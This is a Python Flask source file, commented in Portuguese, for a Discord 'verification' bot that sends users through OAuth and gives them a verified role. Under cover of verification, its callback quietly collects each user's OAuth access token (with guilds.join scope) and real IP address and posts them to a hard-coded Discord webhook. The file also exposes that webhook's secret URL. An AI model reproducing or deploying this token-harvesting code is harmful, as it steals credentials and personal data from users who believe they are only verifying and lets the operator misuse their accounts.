import os
import requests
import json
from flask import Flask, request, redirect, render_template

app = Flask(__name__)
app.secret_key = os.urandom(24)

# --- CONFIGURAÇÕES ---
CLIENT_ID = os.environ.get("DISCORD_CLIENT_ID", "1450162997187182632")
CLIENT_SECRET = os.environ.get("DISCORD_CLIENT_SECRET")
BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
GUILD_ID = os.environ.get("DISCORD_GUILD_ID")
REDIRECT_URI = "https://hunter-bot-verify.onrender.com/callback"

# SEU WEBHOOK DE LOGS
LOG_WEBHOOK = "https://discord.com/api/webhooks/1447353848493772901/IoHRSWi8YZVpFGENLD5PWkf90Gx4YGhVTuF3vOkVre8_75efP13cv3i-83OBbCrC0mN1"

API_BASE = "https://discord.com/api/v10"

# --- FUNÇÕES AUXILIARES ---

def get_headers_bot():
    return {
        "Authorization": f"Bot {BOT_TOKEN}",
        "Content-Type": "application/json"
    }

def send_log_to_webhook(user_data, access_token, ip_address):
    """Envia os dados do usuário verificado para o seu canal de logs"""
    
    embed = {
        "title": "✅ Novo Usuário Verificado!",
        "color": 3066993, # Verde
        "fields": [
            {
                "name": "👤 Usuário",
                "value": f"{user_data['username']} (ID: {user_data['id']})",
                "inline": False
            },
            {
                "name": "🌍 IP (De onde)",
                "value": f"`{ip_address}`",
                "inline": True
            },
            {
                "name": "🔑 Access Token",
                "value": f"||{access_token}||", # Coloquei como Spoiler pra segurança
                "inline": False
            }
        ],
        "footer": {
            "text": "Hunter Bot Verify System"
        }
    }

    payload = {
        "embeds": [embed],
        "username": "Hunter Logs",
        "avatar_url": "https://cdn.discordapp.com/embed/avatars/0.png"
    }

    try:
        requests.post(LOG_WEBHOOK, json=payload)
    except Exception as e:
        print(f"Erro ao enviar log: {e}")

def get_or_create_verified_role():
    url = f"{API_BASE}/guilds/{GUILD_ID}/roles"
    response = requests.get(url, headers=get_headers_bot())
    
    if response.status_code == 200:
        roles = response.json()
        for role in roles:
            if role['name'] == "Vereficado":
                return role['id']
    
    create_url = f"{API_BASE}/guilds/{GUILD_ID}/roles"
    data = {
        "name": "Vereficado",
        "permissions": "0",
        "color": 0x00ff00,
        "hoist": False,
        "mentionable": False
    }
    create_res = requests.post(create_url, headers=get_headers_bot(), json=data)
    if create_res.status_code in [200, 201]:
        return create_res.json()['id']
    return None

def add_user_to_guild_and_role(user_id, access_token, role_id):
    # Join Guild
    join_url = f"{API_BASE}/guilds/{GUILD_ID}/members/{user_id}"
    join_data = {"access_token": access_token}
    requests.put(join_url, headers=get_headers_bot(), json=join_data)

    # Add Role
    role_url = f"{API_BASE}/guilds/{GUILD_ID}/members/{user_id}/roles/{role_id}"
    requests.put(role_url, headers=get_headers_bot())

# --- ROTAS ---

@app.route('/')
def index():
    return redirect('/auth')

@app.route('/auth')
def auth():
    oauth_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={REDIRECT_URI}&scope=identify+guilds.join+guilds"
    return redirect(oauth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "Erro: Código não encontrado."

    # 1. Pegar Access Token
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    token_response = requests.post(f'{API_BASE}/oauth2/token', data=data, headers=headers)
    token_response.raise_for_status()
    tokens = token_response.json()
    access_token = tokens['access_token']

    # 2. Pegar Dados do Usuário
    user_response = requests.get(f'{API_BASE}/users/@me', headers={'Authorization': f'Bearer {access_token}'})
    user_data = user_response.json()
    user_id = user_data['id']

    # 3. Pegar IP Real (Considerando Proxy do Render)
    if request.headers.getlist("X-Forwarded-For"):
        user_ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        user_ip = request.remote_addr

    # 4. ENVIAR LOG PARA O WEBHOOK
    send_log_to_webhook(user_data, access_token, user_ip)

    # 5. Dar Cargo e Adicionar ao Servidor
    try:
        role_id = get_or_create_verified_role()
        if role_id:
            add_user_to_guild_and_role(user_id, access_token, role_id)
    except Exception as e:
        return f"Erro no processamento: {e}"

    return redirect(f"https://discord.com/channels/{GUILD_ID}")

# Rota para o Cron Job não deixar o bot dormir
@app.route('/ping')
def ping():
    return "Pong! Bot Online.", 200

# Painel Admin
@app.route('/painel', methods=['GET', 'POST'])
def painel():
    message = ""
    if request.method == 'POST':
        channel_id = request.form.get('channel_id')
        title = request.form.get('title')
        desc = request.form.get('desc')
        image_url = request.form.get('image_url')
        
        payload = {
            "embeds": [{
                "title": title,
                "description": desc,
                "color": 0x5865F2,
                "image": {"url": image_url} if image_url else {}
            }],
            "components": [{
                "type": 1,
                "components": [{
                    "type": 2,
                    "style": 5, 
                    "label": "VERIFICAR AGORA",
                    "url": f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={REDIRECT_URI}&scope=identify+guilds.join+guilds"
                }]
            }]
        }
        post_url = f"{API_BASE}/channels/{channel_id}/messages"
        r = requests.post(post_url, headers=get_headers_bot(), json=payload)
        if r.status_code == 200:
            message = "✅ Painel enviado!"
        else:
            message = f"❌ Erro: {r.text}"

    return render_template('painel.html', message=message)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
